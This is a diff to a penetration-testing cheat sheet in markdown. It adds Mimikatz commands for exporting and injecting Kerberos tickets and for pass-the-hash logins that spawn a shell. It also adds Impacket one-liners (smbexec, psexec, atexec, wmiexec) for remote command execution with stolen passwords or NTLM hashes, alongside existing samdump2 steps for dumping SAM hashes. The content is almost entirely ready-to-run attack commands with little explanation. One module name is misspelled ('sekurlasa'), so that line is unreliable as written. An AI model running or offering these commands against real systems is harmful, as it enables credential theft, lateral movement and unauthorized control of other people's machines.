@@ -110,17 +110,53 @@ mount <image> /mnt/mountpoint
 cd /mnt/mountpoint/Windows/system32/config
 samdump2 SYSTEM SAM
 ```
-
-# Stealing tickets with Mimikatz
+# mimikatz
+## Stealing tickets with Mimikatz
 Tickets will be written to file system
 ```batch
 mimikatz# kerberos::list /export
+```
+```batch
+kerberos::list /export
 ```
 Loading a ticket
 ```batch
 mimikatz# kerberos::ptt <ticket-file>
 mimikatz# kerberos::list
+```
+```batch
+kerberos::ptt <ticket-file>
+kerberos::list
+```
+## Authenticating with SMB using NTLM hash
+This will launch a cmd.exe shell as the specified user
+```batch
+mimikatz# sekurlasa::pth /user:chris /domain:<DOMAIN> /ntlm:<HASH> /run:cmd.exe
+```
+```batch
+sekurlasa::pth /user:chris /domain:<DOMAIN> /ntlm:<HASH> /run:cmd.exe
+```
 
+# Impacket
+Scripts for talking to services via windows RPC functions
+```bash
+# launch cmd shell via smb
+smbexec.py [[domain/]username[:password]@]<targetName or address>
+smbexec.py -hashes LMHASH:NTHASH $TARGET
+smbexec.py Administrator:AdminPass@10.10.10.1
+
+# command exec
+psexec.py  <DOMAIN>/<USERNAME>:<PASSWORD>@$target cmd.exe
+psexec.py  -hashes LMHASH:NTHASH $TARGET cmd.exe
+
+# start/stop services
+services.py 
+
+# exec a command with the AT interface
+atexec.py $target $cmd
+
+# exec with wmi, fileless
+wmiexec.py $target $cmd
 ```
 
 ## Cheat Sheets
